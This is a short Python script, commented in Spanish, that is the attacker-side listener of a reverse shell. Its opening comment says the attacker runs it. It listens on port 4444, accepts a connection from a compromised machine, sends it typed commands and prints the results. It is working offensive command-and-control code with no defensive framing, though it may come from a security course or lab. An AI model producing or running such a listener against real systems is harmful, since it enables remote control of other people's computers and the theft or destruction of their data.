# Este fichero tiene que ser ejecutado por el atacante

import socket

servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
servidor.bind(("127.0.0.1", 4444)) # IP del atacante y puerto de escucha
servidor.listen(1)

cliente, direccion = servidor.accept()

while True:
    comando = input("Comando: ")
    cliente.send(comando.encode())
    if comando.lower() == "exit":
        break
    resultado = cliente.recv(1024).decode()
    print(resultado)

cliente.close()
servidor.close()